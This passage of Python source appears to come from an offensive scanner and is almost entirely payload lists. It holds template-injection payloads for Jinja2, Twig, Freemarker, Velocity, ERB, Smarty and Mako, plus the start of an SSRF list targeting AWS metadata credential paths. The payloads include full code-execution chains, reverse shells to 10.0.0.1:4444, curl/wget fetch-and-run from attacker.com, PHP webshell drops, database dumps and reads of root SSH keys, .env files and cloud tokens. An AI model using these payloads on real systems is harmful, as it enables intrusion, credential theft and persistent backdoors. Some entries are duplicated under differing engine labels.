        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(100)}}", 'Jinja2 Subclass Index 100'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(120)}}", 'Jinja2 Subclass Index 120'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(140)}}", 'Jinja2 Subclass Index 140'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(160)}}", 'Jinja2 Subclass Index 160'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(180)}}", 'Jinja2 Subclass Index 180'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(200)}}", 'Jinja2 Subclass Index 200'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(250)}}", 'Jinja2 Subclass Index 250'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(300)}}", 'Jinja2 Subclass Index 300'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(350)}}", 'Jinja2 Subclass Index 350'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(400)}}", 'Jinja2 Subclass Index 400'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(450)}}", 'Jinja2 Subclass Index 450'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(500)}}", 'Jinja2 Subclass Index 500'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(600)}}", 'Jinja2 Subclass Index 600'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(700)}}", 'Jinja2 Subclass Index 700'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(800)}}", 'Jinja2 Subclass Index 800'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(900)}}", 'Jinja2 Subclass Index 900'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(1000)}}", 'Jinja2 Subclass Index 1000'),
        
        # ==================== 701-750: GENERIC / UNKNOWN TEMPLATE ENGINES ====================
        ('{{7*7}}', 'Generic Math Double Brace'),
        ('${7*7}', 'Generic Math Dollar Brace'),
        ('<%= 7*7 %>', 'Generic Math ERB Style'),
        ('#{7*7}', 'Generic Math Hash Brace'),
        ('{7*7}', 'Generic Math Brace'),
        ('[[7*7]]', 'Generic Math Double Bracket'),
        ('<$ 7*7 $>', 'Generic Math ASP Style'),
        ('{% 7*7 %}', 'Generic Math Twig Style'),
        ('<* 7*7 *>', 'Generic Math Star Style'),
        ('(* 7*7 *)', 'Generic Math Paren Style'),
        ('{{7*7}}', 'Generic Jinja2 Style'),
        ('{{7*7}}', 'Generic Twig Style'),
        ('${7*7}', 'Generic Freemarker Style'),
        ('${7*7}', 'Generic Velocity Style'),
        ('<%= 7*7 %>', 'Generic ERB Style'),
        ('<%= 7*7 %>', 'Generic eRuby Style'),
        ('{{7*7}}', 'Generic Nunjucks Style'),
        ('{{7*7}}', 'Generic Handlebars Style'),
        ('{{7*7}}', 'Generic Mustache Style'),
        ('{{7*7}}', 'Generic Vue Style'),
        ('{{7*7}}', 'Generic AngularJS Style'),
        ('${7*7}', 'Generic JSP EL Style'),
        ('#{7*7}', 'Generic JSF Style'),
        ('{7*7}', 'Generic Smarty Style'),
        ('{$7*7}', 'Generic Smarty Dollar'),
        ('{$smarty.const.7*7}', 'Generic Smarty Const'),
        ('{{7*7}}', 'Generic Blade Style'),
        ('<?= 7*7 ?>', 'Generic PHP Short Tag'),
        ('<% =7*7 %>', 'Generic ASP Classic'),
        ('<%=7*7%>', 'Generic ASP.NET'),
        ('{{7*7}}', 'Generic Go Template'),
        ('{{7*7}}', 'Generic Hugo Style'),
        ('{{7*7}}', 'Generic Jekyll Style'),
        ('{{7*7}}', 'Generic Eleventy Style'),
        ('{{7*7}}', 'Generic 11ty Style'),
        ('{{7*7}}', 'Generic Metalsmith Style'),
        ('{{7*7}}', 'Generic Wintersmith Style'),
        ('{{7*7}}', 'Generic Hexo Style'),
        ('{{7*7}}', 'Generic Gatsby Style'),
        ('{{7*7}}', 'Generic Next.js Style'),
        ('{{7*7}}', 'Generic Nuxt Style'),
        ('{{7*7}}', 'Generic Svelte Style'),
        ('{{7*7}}', 'Generic Astro Style'),
        ('{{7*7}}', 'Generic Qwik Style'),
        ('{{7*7}}', 'Generic Solid Style'),
        ('{{7*7}}', 'Generic Marko Style'),
        ('{{7*7}}', 'Generic Pug Style'),
        ('{{7*7}}', 'Generic Jade Style'),
        ('{{7*7}}', 'Generic EJS Style'),
        ('{{7*7}}', 'Generic PUG Style'),
        
        # ==================== 751-800: JINJA2 - CHAINED BYPASSES ====================
        ("{{''.__class__.__mro__[1].__subclasses__()[40]}}", 'Jinja2 Subclass 40'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__}}", 'Jinja2 Subclass Init'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__}}", 'Jinja2 Init Globals'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__']}}", 'Jinja2 Builtins'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__']['__import__']}}", 'Jinja2 Import Function'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__']['__import__']('os')}}", 'Jinja2 Import OS'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__']['__import__']('os').popen('id')}}", 'Jinja2 Popen'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}", 'Jinja2 Complete RCE'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__.get('__builtins__').get('__import__')('os').popen('id').read()}}", 'Jinja2 Get Chain'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__.get('__builtins__').get('eval')('__import__(\"os\").popen(\"id\").read()')}}", 'Jinja2 Eval Chain'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__']['exec']('import os; print(os.popen(\"id\").read())')}}", 'Jinja2 Exec Chain'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__']['compile']('import os; os.system(\"id\")','','exec')}}", 'Jinja2 Compile Chain'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os']}}", 'Jinja2 Direct OS'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].popen('id').read()}}", 'Jinja2 OS Popen'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['subprocess'].Popen('id',shell=True).stdout.read()}}", 'Jinja2 Subprocess'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}", 'Jinja2 Builtin Open'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()}}", 'Jinja2 Builtin File'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__']['raw_input']()}}", 'Jinja2 Raw Input'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__']['input']()}}", 'Jinja2 Input'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__']['print']('test')}}", 'Jinja2 Print'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__']['__dict__']}}", 'Jinja2 Builtins Dict'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__'].keys()}}", 'Jinja2 Builtins Keys'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__'].values()}}", 'Jinja2 Builtins Values'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__'].items()}}", 'Jinja2 Builtins Items'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['system']}}", 'Jinja2 System'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['popen']}}", 'Jinja2 Popen Global'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['exec']}}", 'Jinja2 Exec Global'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['eval']}}", 'Jinja2 Eval Global'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__']['__dict__']['__import__']('os').popen('id').read()}}", 'Jinja2 Dict Import'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['__builtins__'].__dict__['__import__']('os').popen('id').read()}}", 'Jinja2 Dict Import Alt'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].__dict__['popen']('id').read()}}", 'Jinja2 OS Dict Popen'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].__dict__['system']('id')}}", 'Jinja2 OS Dict System'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['subprocess'].__dict__['Popen']('id',shell=True).stdout.read()}}", 'Jinja2 Subprocess Dict'),
        
        # ==================== 801-850: JINJA2 - ALTERNATIVE SUBSCRIPT NUMBERS ====================
        ("{{[].__class__.__bases__[0].__subclasses__()[40]}}", 'Jinja2 List Base 40'),
        ("{{[].__class__.__bases__[0].__subclasses__()[41]}}", 'Jinja2 List Base 41'),
        ("{{[].__class__.__bases__[0].__subclasses__()[42]}}", 'Jinja2 List Base 42'),
        ("{{[].__class__.__bases__[0].__subclasses__()[43]}}", 'Jinja2 List Base 43'),
        ("{{[].__class__.__bases__[0].__subclasses__()[44]}}", 'Jinja2 List Base 44'),
        ("{{[].__class__.__bases__[0].__subclasses__()[45]}}", 'Jinja2 List Base 45'),
        ("{{[].__class__.__bases__[0].__subclasses__()[46]}}", 'Jinja2 List Base 46'),
        ("{{[].__class__.__bases__[0].__subclasses__()[47]}}", 'Jinja2 List Base 47'),
        ("{{[].__class__.__bases__[0].__subclasses__()[48]}}", 'Jinja2 List Base 48'),
        ("{{[].__class__.__bases__[0].__subclasses__()[49]}}", 'Jinja2 List Base 49'),
        ("{{[].__class__.__bases__[0].__subclasses__()[50]}}", 'Jinja2 List Base 50'),
        ("{{[].__class__.__bases__[0].__subclasses__()[51]}}", 'Jinja2 List Base 51'),
        ("{{[].__class__.__bases__[0].__subclasses__()[52]}}", 'Jinja2 List Base 52'),
        ("{{[].__class__.__bases__[0].__subclasses__()[53]}}", 'Jinja2 List Base 53'),
        ("{{[].__class__.__bases__[0].__subclasses__()[54]}}", 'Jinja2 List Base 54'),
        ("{{[].__class__.__bases__[0].__subclasses__()[55]}}", 'Jinja2 List Base 55'),
        ("{{[].__class__.__bases__[0].__subclasses__()[56]}}", 'Jinja2 List Base 56'),
        ("{{[].__class__.__bases__[0].__subclasses__()[57]}}", 'Jinja2 List Base 57'),
        ("{{[].__class__.__bases__[0].__subclasses__()[58]}}", 'Jinja2 List Base 58'),
        ("{{[].__class__.__bases__[0].__subclasses__()[59]}}", 'Jinja2 List Base 59'),
        ("{{[].__class__.__bases__[0].__subclasses__()[60]}}", 'Jinja2 List Base 60'),
        ("{{[].__class__.__bases__[0].__subclasses__()[61]}}", 'Jinja2 List Base 61'),
        ("{{[].__class__.__bases__[0].__subclasses__()[62]}}", 'Jinja2 List Base 62'),
        ("{{[].__class__.__bases__[0].__subclasses__()[63]}}", 'Jinja2 List Base 63'),
        ("{{[].__class__.__bases__[0].__subclasses__()[64]}}", 'Jinja2 List Base 64'),
        ("{{[].__class__.__bases__[0].__subclasses__()[65]}}", 'Jinja2 List Base 65'),
        ("{{[].__class__.__bases__[0].__subclasses__()[66]}}", 'Jinja2 List Base 66'),
        ("{{[].__class__.__bases__[0].__subclasses__()[67]}}", 'Jinja2 List Base 67'),
        ("{{[].__class__.__bases__[0].__subclasses__()[68]}}", 'Jinja2 List Base 68'),
        ("{{[].__class__.__bases__[0].__subclasses__()[69]}}", 'Jinja2 List Base 69'),
        ("{{[].__class__.__bases__[0].__subclasses__()[70]}}", 'Jinja2 List Base 70'),
        ("{{[].__class__.__bases__[0].__subclasses__()[71]}}", 'Jinja2 List Base 71'),
        ("{{[].__class__.__bases__[0].__subclasses__()[72]}}", 'Jinja2 List Base 72'),
        ("{{[].__class__.__bases__[0].__subclasses__()[73]}}", 'Jinja2 List Base 73'),
        ("{{[].__class__.__bases__[0].__subclasses__()[74]}}", 'Jinja2 List Base 74'),
        ("{{[].__class__.__bases__[0].__subclasses__()[75]}}", 'Jinja2 List Base 75'),
        ("{{[].__class__.__bases__[0].__subclasses__()[76]}}", 'Jinja2 List Base 76'),
        ("{{[].__class__.__bases__[0].__subclasses__()[77]}}", 'Jinja2 List Base 77'),
        ("{{[].__class__.__bases__[0].__subclasses__()[78]}}", 'Jinja2 List Base 78'),
        ("{{[].__class__.__bases__[0].__subclasses__()[79]}}", 'Jinja2 List Base 79'),
        ("{{[].__class__.__bases__[0].__subclasses__()[80]}}", 'Jinja2 List Base 80'),
        ("{{[].__class__.__bases__[0].__subclasses__()[81]}}", 'Jinja2 List Base 81'),
        ("{{[].__class__.__bases__[0].__subclasses__()[82]}}", 'Jinja2 List Base 82'),
        ("{{[].__class__.__bases__[0].__subclasses__()[83]}}", 'Jinja2 List Base 83'),
        ("{{[].__class__.__bases__[0].__subclasses__()[84]}}", 'Jinja2 List Base 84'),
        ("{{[].__class__.__bases__[0].__subclasses__()[85]}}", 'Jinja2 List Base 85'),
        ("{{[].__class__.__bases__[0].__subclasses__()[86]}}", 'Jinja2 List Base 86'),
        ("{{[].__class__.__bases__[0].__subclasses__()[87]}}", 'Jinja2 List Base 87'),
        ("{{[].__class__.__bases__[0].__subclasses__()[88]}}", 'Jinja2 List Base 88'),
        ("{{[].__class__.__bases__[0].__subclasses__()[89]}}", 'Jinja2 List Base 89'),
        ("{{[].__class__.__bases__[0].__subclasses__()[90]}}", 'Jinja2 List Base 90'),
        
        # ==================== 851-900: JINJA2 - REVERSE SHELL PAYLOADS ====================
        ("{{ lipsum.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"').read() }}", 'Jinja2 Reverse Shell 1'),
        ("{{ lipsum.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\"').read() }}", 'Jinja2 Reverse Shell 2'),
        ("{{ lipsum.__globals__.os.popen('python -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"10.0.0.1\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"').read() }}", 'Jinja2 Python Reverse'),
        ("{{ lipsum.__globals__.os.popen('python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"10.0.0.1\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"').read() }}", 'Jinja2 Python3 Reverse'),
        ("{{ lipsum.__globals__.os.popen('perl -e \"use Socket;$i=\\\"10.0.0.1\\\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");}\"').read() }}", 'Jinja2 Perl Reverse'),
        ("{{ lipsum.__globals__.os.popen('php -r \"$sock=fsockopen(\\\"10.0.0.1\\\",4444);exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");\"').read() }}", 'Jinja2 PHP Reverse'),
        ("{{ lipsum.__globals__.os.popen('ruby -rsocket -e \"c=TCPSocket.new(\\\"10.0.0.1\\\",4444);while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end\"').read() }}", 'Jinja2 Ruby Reverse'),
        ("{{ lipsum.__globals__.os.popen('nc -e /bin/sh 10.0.0.1 4444').read() }}", 'Jinja2 Netcat Reverse'),
        ("{{ lipsum.__globals__.os.popen('nc -e /bin/bash 10.0.0.1 4444').read() }}", 'Jinja2 Netcat Bash'),
        ("{{ lipsum.__globals__.os.popen('telnet 10.0.0.1 4444 | /bin/sh | telnet 10.0.0.1 4445').read() }}", 'Jinja2 Telnet Reverse'),
        ("{{ lipsum.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f').read() }}", 'Jinja2 FIFO Reverse'),
        ("{{ lipsum.__globals__.os.popen('rm -f /tmp/p; mknod /tmp/p p && nc 10.0.0.1 4444 0</tmp/p | /bin/sh 1>/tmp/p').read() }}", 'Jinja2 MKNOD Reverse'),
        ("{{ lipsum.__globals__.os.popen('nohup nc -e /bin/sh 10.0.0.1 4444 &').read() }}", 'Jinja2 Nohup Reverse'),
        ("{{ lipsum.__globals__.os.popen('screen -dm bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"').read() }}", 'Jinja2 Screen Reverse'),
        ("{{ lipsum.__globals__.os.popen('tmux new-session -d \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"').read() }}", 'Jinja2 Tmux Reverse'),
        ("{{ lipsum.__globals__.os.popen('socat exec:/bin/sh,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444').read() }}", 'Jinja2 Socat Reverse'),
        ("{{ lipsum.__globals__.os.popen('echo \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\" | at now').read() }}", 'Jinja2 At Reverse'),
        ("{{ lipsum.__globals__.os.popen('curl http://attacker.com/revshell.sh | bash').read() }}", 'Jinja2 Curl Bash'),
        ("{{ lipsum.__globals__.os.popen('wget http://attacker.com/revshell.sh -O /tmp/revshell.sh && bash /tmp/revshell.sh').read() }}", 'Jinja2 Wget Execute'),
        ("{{ lipsum.__globals__.os.popen('python -c \"__import__(\"\"urllib\"\").urlopen(\"\"http://attacker.com/revshell.py\"\").read()\" | python').read() }}", 'Jinja2 Python Urllib Execute'),
        ("{{ lipsum.__globals__.os.popen('echo \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"10.0.0.1\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\" > /tmp/rev.py && python /tmp/rev.py').read() }}", 'Jinja2 Python Write Execute'),
        ("{{ lipsum.__globals__.os.popen('base64 -d <<< \"aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjAuMC4xJyw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9zaCcsJy1pJ10p\" | python').read() }}", 'Jinja2 Base64 Python'),
        
        # ==================== 901-950: JINJA2 - FILE WRITE & WEBSHELL ====================
        ("{{ lipsum.__globals__.os.popen('echo \"<?php eval($_GET[cmd]); ?>\" > /var/www/html/shell.php').read() }}", 'Jinja2 Write PHP Webshell'),
        ("{{ lipsum.__globals__.os.popen('echo \"<?php system($_REQUEST[cmd]); ?>\" > /var/www/html/shell.php').read() }}", 'Jinja2 Write PHP System'),
        ("{{ lipsum.__globals__.os.popen('echo \"<?php echo shell_exec($_GET[cmd]); ?>\" > /var/www/html/shell.php').read() }}", 'Jinja2 Write PHP ShellExec'),
        ("{{ lipsum.__globals__.os.popen('echo \"<?php passthru($_GET[cmd]); ?>\" > /var/www/html/shell.php').read() }}", 'Jinja2 Write PHP Passthru'),
        ("{{ lipsum.__globals__.os.popen('echo \"<?php exec($_GET[cmd],$o);print(implode(\\\"\\n\\\",$o));?>\" > /var/www/html/shell.php').read() }}", 'Jinja2 Write PHP Exec'),
        ("{{ lipsum.__globals__.os.popen('echo \"<%= system(\"\"cmd\"\") %>\" > /var/www/html/shell.erb').read() }}", 'Jinja2 Write ERB Shell'),
        ("{{ lipsum.__globals__.os.popen('echo \"#{system(\"cmd\")}\" > /var/www/html/shell.erb').read() }}", 'Jinja2 Write ERB Shell2'),
        ("{{ lipsum.__globals__.os.popen('curl http://attacker.com/shell.php -o /var/www/html/shell.php').read() }}", 'Jinja2 Curl Webshell'),
        ("{{ lipsum.__globals__.os.popen('wget http://attacker.com/shell.php -O /var/www/html/shell.php').read() }}", 'Jinja2 Wget Webshell'),
        ("{{ lipsum.__globals__.os.popen('fetch http://attacker.com/shell.php -o /var/www/html/shell.php').read() }}", 'Jinja2 Fetch Webshell'),
        ("{{ lipsum.__globals__.os.popen('scp attacker.com:/var/www/html/shell.php /var/www/html/shell.php').read() }}", 'Jinja2 SCP Webshell'),
        ("{{ lipsum.__globals__.os.popen('cp /etc/passwd /var/www/html/passwd.txt').read() }}", 'Jinja2 Copy Passwd'),
        ("{{ lipsum.__globals__.os.popen('cat /etc/passwd > /var/www/html/passwd.txt').read() }}", 'Jinja2 Cat Passwd'),
        ("{{ lipsum.__globals__.os.popen('find / -name \"*.php\" 2>/dev/null > /var/www/html/php_files.txt').read() }}", 'Jinja2 Find PHP'),
        ("{{ lipsum.__globals__.os.popen('ls -la / > /var/www/html/root_ls.txt').read() }}", 'Jinja2 LS Root'),
        ("{{ lipsum.__globals__.os.popen('df -h > /var/www/html/disk_usage.txt').read() }}", 'Jinja2 DF Output'),
        ("{{ lipsum.__globals__.os.popen('ps aux > /var/www/html/processes.txt').read() }}", 'Jinja2 PS Output'),
        ("{{ lipsum.__globals__.os.popen('netstat -an > /var/www/html/netstat.txt').read() }}", 'Jinja2 Netstat Output'),
        ("{{ lipsum.__globals__.os.popen('ifconfig > /var/www/html/ifconfig.txt').read() }}", 'Jinja2 Ifconfig Output'),
        ("{{ lipsum.__globals__.os.popen('route -n > /var/www/html/route.txt').read() }}", 'Jinja2 Route Output'),
        ("{{ lipsum.__globals__.os.popen('history > /var/www/html/history.txt').read() }}", 'Jinja2 History Output'),
        ("{{ lipsum.__globals__.os.popen('cat /var/log/apache2/access.log > /var/www/html/apache_logs.txt').read() }}", 'Jinja2 Apache Logs'),
        ("{{ lipsum.__globals__.os.popen('cat /var/log/auth.log > /var/www/html/auth_logs.txt').read() }}", 'Jinja2 Auth Logs'),
        ("{{ lipsum.__globals__.os.popen('tar -czf /var/www/html/backup.tar.gz /etc /var/www').read() }}", 'Jinja2 Tar Backup'),
        ("{{ lipsum.__globals__.os.popen('zip -r /var/www/html/backup.zip /etc /var/www').read() }}", 'Jinja2 Zip Backup'),
        ("{{ lipsum.__globals__.os.popen('mysqldump -u root --all-databases > /var/www/html/db_dump.sql').read() }}", 'Jinja2 MySQL Dump'),
        ("{{ lipsum.__globals__.os.popen('pg_dumpall -U postgres > /var/www/html/pg_dump.sql').read() }}", 'Jinja2 PostgreSQL Dump'),
        
        # ==================== 951-1000: FINAL COVERAGE & COMBINATIONS ====================
        ("{{7*7}}", 'Final Math Check'),
        ("{{7*7}}", 'Final Double Check'),
        ('<%= 7*7 %>', 'Final ERB Check'),
        ('${7*7}', 'Final Freemarker Check'),
        ('{7*7}', 'Final Smarty Check'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}", 'Final File Read'),
        ("{{ cycler.__init__.__globals__.os.popen('id').read() }}", 'Final Cycler RCE'),
        ("{{ lipsum.__globals__.os.popen('id').read() }}", 'Final Lipsum RCE'),
        ("{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}", 'Final Config RCE'),
        ("{{ request|attr('application')|attr('__self__')|attr('_get_data_for_json')|attr('__globals__')|attr('__builtins__')|attr('__import__')('os')|attr('popen')('id')|attr('read')() }}", 'Final Filter Chain'),
        ("{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", 'Final Self Builtins'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}", 'Final List Import'),
        ('{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}', 'Final Twig RCE'),
        ('${"freemarker.template.utility.Execute"?new()("id")}', 'Final Freemarker Execute'),
        ('#set($x=$class.forName("java.lang.Runtime").getRuntime().exec("id"))', 'Final Velocity RCE'),
        ('<%= system("id") %>', 'Final ERB System'),
        ('{php}system("id");{/php}', 'Final Smarty PHP'),
        ('${__import__("os").popen("id").read()}', 'Final Mako Import'),
        ('{{7*7}}', 'Final Generic'),
        ('<%= 7*7 %>', 'Final Generic2'),
        ('<%= 7*7 %>', 'Final Generic3'),
        ('<%= 7*7 %>', 'Final Generic4'),
        ('<%= 7*7 %>', 'Final Generic5'),
        ("{{ lipsum.__globals__.os.popen('cat /etc/passwd').read() }}", 'Final Cat Passwd'),
        ("{{ lipsum.__globals__.os.popen('whoami').read() }}", 'Final Whoami'),
        ("{{ lipsum.__globals__.os.popen('ls -la').read() }}", 'Final LS'),
        ("{{ lipsum.__globals__.os.popen('pwd').read() }}", 'Final PWD'),
        ("{{ lipsum.__globals__.os.popen('hostname').read() }}", 'Final Hostname'),
        ("{{ lipsum.__globals__.os.popen('uname -a').read() }}", 'Final Uname'),
        ("{{ lipsum.__globals__.os.popen('id').read() }}", 'Final ID'),
        ("{{ lipsum.__globals__.os.popen('env').read() }}", 'Final Env'),
        ("{{ lipsum.__globals__.os.popen('printenv').read() }}", 'Final Printenv'),
        ("{{ lipsum.__globals__.os.popen('cat /etc/hostname').read() }}", 'Final Hostname2'),
        ("{{ lipsum.__globals__.os.popen('cat /etc/hosts').read() }}", 'Final Hosts'),
        ("{{ lipsum.__globals__.os.popen('cat /etc/resolv.conf').read() }}", 'Final Resolv'),
        ("{{ lipsum.__globals__.os.popen('cat /etc/fstab').read() }}", 'Final Fstab'),
        ("{{ lipsum.__globals__.os.popen('cat /etc/mtab').read() }}", 'Final Mtab'),
        ("{{ lipsum.__globals__.os.popen('cat /etc/crontab').read() }}", 'Final Crontab'),
        ("{{ lipsum.__globals__.os.popen('cat /etc/ssh/sshd_config').read() }}", 'Final SSH Config'),
        ("{{ lipsum.__globals__.os.popen('cat /root/.ssh/id_rsa').read() }}", 'Final Root SSH'),
        ("{{ lipsum.__globals__.os.popen('cat /var/www/html/.env').read() }}", 'Final Env File'),
        ("{{ lipsum.__globals__.os.popen('cat /var/www/html/wp-config.php').read() }}", 'Final WP Config'),
        ("{{ lipsum.__globals__.os.popen('curl http://169.254.169.254/latest/meta-data/').read() }}", 'Final AWS Metadata'),
        ("{{ lipsum.__globals__.os.popen('curl http://169.254.169.254/latest/user-data/').read() }}", 'Final AWS User Data'),
        ("{{ lipsum.__globals__.os.popen('curl http://metadata.google.internal/computeMetadata/v1/').read() }}", 'Final GCP Metadata'),
        ("{{ lipsum.__globals__.os.popen('curl -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token').read() }}", 'Final GCP Token'),
        ("{{ lipsum.__globals__.os.popen('cat /proc/self/environ').read() }}", 'Final Proc Environ'),
        ("{{ lipsum.__globals__.os.popen('cat /proc/self/cmdline').read() }}", 'Final Proc Cmdline'),
        ("{{ lipsum.__globals__.os.popen('cat /proc/self/status').read() }}", 'Final Proc Status'),
    ]

    # ─── SSRF Payloads — 30+ vectors ──────────────────────────────────────
    SSRF_PAYLOADS = [
        # ==================== 1-50: AWS METADATA ====================
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/root',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/default',
        'http://169.254.169.254/latest/user-data/',
        'http://169.254.169.254/latest/user-data/script.sh',
        'http://169.254.169.254/latest/meta-data/public-keys/',
        'http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key',
        'http://169.254.169.254/latest/meta-data/public-keys/0/id_rsa',
        'http://169.254.169.254/latest/meta-data/public-keys/1/openssh-key',
        'http://169.254.169.254/latest/meta-data/hostname',
        'http://169.254.169.254/latest/meta-data/instance-id',
        'http://169.254.169.254/latest/meta-data/instance-type',
        'http://169.254.169.254/latest/meta-data/local-ipv4',
        'http://169.254.169.254/latest/meta-data/public-ipv4',
        'http://169.254.169.254/latest/meta-data/local-hostname',
        'http://169.254.169.254/latest/meta-data/public-hostname',
        'http://169.254.169.254/latest/meta-data/ami-id',
        'http://169.254.169.254/latest/meta-data/ami-manifest-path',
        'http://169.254.169.254/latest/meta-data/ancestor-ami-ids',
        'http://169.254.169.254/latest/meta-data/block-device-mapping/',
        'http://169.254.169.254/latest/meta-data/events/',
        'http://169.254.169.254/latest/meta-data/identity-credentials/',
        'http://169.254.169.254/latest/meta-data/instance-action',
        'http://169.254.169.254/latest/meta-data/instance-life-cycle',
        'http://169.254.169.254/latest/meta-data/interfaces/',
        'http://169.254.169.254/latest/meta-data/mac',
        'http://169.254.169.254/latest/meta-data/metrics/',
        'http://169.254.169.254/latest/meta-data/network/',
        'http://169.254.169.254/latest/meta-data/placement/',
        'http://169.254.169.254/latest/meta-data/profile',
        'http://169.254.169.254/latest/meta-data/reservation-id',
        'http://169.254.169.254/latest/meta-data/security-groups',
        'http://169.254.169.254/latest/meta-data/services/',
        'http://169.254.169.254/latest/meta-data/spot/',
        'http://169.254.169.254/latest/dynamic/',
        'http://169.254.169.254/latest/dynamic/instance-identity/',
